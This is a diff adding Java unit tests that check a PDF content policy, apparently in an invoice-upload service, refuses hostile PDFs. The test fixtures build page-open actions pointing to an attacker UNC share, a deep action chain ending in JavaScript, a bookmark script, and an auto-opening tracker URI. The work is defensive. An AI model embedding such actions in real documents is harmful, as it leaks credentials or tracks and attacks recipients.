@@ -188,6 +188,103 @@ class PdfContentPolicyTest {
         refused(FileCategory.SUPPLIER_INVOICE, broken, "cannot be read");
     }
 
+    /** An action dictionary of type {@code type}, as a hostile file writes it, without PDFBox's typed wrappers. */
+    private static org.apache.pdfbox.cos.COSDictionary action(String type) {
+        var action = new org.apache.pdfbox.cos.COSDictionary();
+        action.setItem(org.apache.pdfbox.cos.COSName.TYPE, org.apache.pdfbox.cos.COSName.getPDFName("Action"));
+        action.setItem(org.apache.pdfbox.cos.COSName.S, org.apache.pdfbox.cos.COSName.getPDFName(type));
+        return action;
+    }
+
+    private static void onPageOpen(PDDocument document, org.apache.pdfbox.cos.COSDictionary action) {
+        var triggers = new org.apache.pdfbox.cos.COSDictionary();
+        triggers.setItem(org.apache.pdfbox.cos.COSName.getPDFName("O"), action);
+        document.getPage(0).getCOSObject().setItem(org.apache.pdfbox.cos.COSName.AA, triggers);
+    }
+
+    @Test
+    void anActionThatOpensSendsOrLoadsSomethingIsRefused() throws Exception {
+        for (String type : java.util.List.of("GoToE", "GoToR", "SubmitForm", "ImportData", "Rendition", "Made-Up")) {
+            refused(FileCategory.SUPPLIER_INVOICE, pdf(type + ".pdf", document -> {
+                var action = action(type);
+                action.setString(org.apache.pdfbox.cos.COSName.F, "\\\\attacker\\share\\x.pdf");
+                onPageOpen(document, action);
+            }), type + " action");
+        }
+    }
+
+    @Test
+    void aChainLongerThanAnyDocumentBuildsIsRefusedNotCutShort() throws Exception {
+        refused(FileCategory.SUPPLIER_INVOICE, pdf("deep.pdf", document -> {
+            var head = action("GoTo");
+            var tail = head;
+            for (int i = 0; i < 70; i++) {
+                var next = action("GoTo");
+                tail.setItem(org.apache.pdfbox.cos.COSName.getPDFName("Next"), next);
+                tail = next;
+            }
+            tail.setItem(org.apache.pdfbox.cos.COSName.getPDFName("Next"), new PDActionJavaScript("app.alert(1)")
+                    .getCOSObject());
+            document.getDocumentCatalog().getCOSObject().setItem(org.apache.pdfbox.cos.COSName.getPDFName("OpenAction"),
+                    head);
+        }), "chains more actions");
+    }
+
+    @Test
+    void aBookmarksScriptIsRefused() throws Exception {
+        refused(FileCategory.DOCUMENT, pdf("outline.pdf", document -> {
+            var outline = new org.apache.pdfbox.pdmodel.interactive.documentnavigation.outline.PDDocumentOutline();
+            var first = new org.apache.pdfbox.pdmodel.interactive.documentnavigation.outline.PDOutlineItem();
+            first.setTitle("Trang 1");
+            var second = new org.apache.pdfbox.pdmodel.interactive.documentnavigation.outline.PDOutlineItem();
+            second.setTitle("Mục lục");
+            second.setAction(new PDActionJavaScript("app.alert('bookmark')"));
+            outline.addLast(first);
+            first.addLast(second);
+            document.getDocumentCatalog().setDocumentOutline(outline);
+        }), "JavaScript");
+    }
+
+    @Test
+    void aClickedWebLinkPassesButOneThatOpensByItselfIsRefused() throws Exception {
+        Path clicked = pdf("link-uri.pdf", document -> {
+            var link = new PDAnnotationLink();
+            link.setRectangle(new PDRectangle(10, 10, 50, 50));
+            var uri = new org.apache.pdfbox.pdmodel.interactive.action.PDActionURI();
+            uri.setURI("https://hoadondientu.gdt.gov.vn");
+            link.setAction(uri);
+            try {
+                document.getPage(0).getAnnotations().add(link);
+            } catch (java.io.IOException ex) {
+                throw new RuntimeException(ex);
+            }
+        });
+        assertThatCode(() -> PdfContentPolicy.check(FileCategory.SUPPLIER_INVOICE, "application/pdf", clicked))
+                .doesNotThrowAnyException();
+        refused(FileCategory.SUPPLIER_INVOICE, pdf("open-uri.pdf", document -> {
+            var uri = new org.apache.pdfbox.pdmodel.interactive.action.PDActionURI();
+            uri.setURI("https://tracker.example/opened");
+            document.getDocumentCatalog().setOpenAction(uri);
+        }), "URI action");
+    }
+
+    @Test
+    void anAnnotationWithoutASubtypeIsReadNotAServerFault() throws Exception {
+        Path odd = pdf("no-subtype.pdf", document -> {
+            var annotation = new org.apache.pdfbox.cos.COSDictionary();
+            var box = new org.apache.pdfbox.cos.COSArray();
+            for (int corner : new int[] {0, 0, 1, 1}) {
+                box.add(org.apache.pdfbox.cos.COSInteger.get(corner));
+            }
+            annotation.setItem(org.apache.pdfbox.cos.COSName.RECT, box);
+            var annotations = new org.apache.pdfbox.cos.COSArray();
+            annotations.add(annotation);
+            document.getPage(0).getCOSObject().setItem(org.apache.pdfbox.cos.COSName.ANNOTS, annotations);
+        });
+        assertThatCode(() -> PdfContentPolicy.check(FileCategory.SUPPLIER_INVOICE, "application/pdf", odd))
+                .doesNotThrowAnyException();
+    }
+
     private static void protect(PDDocument document, String userPassword) {
         try {
             var policy = new StandardProtectionPolicy("owner-secret", userPassword, new AccessPermission());
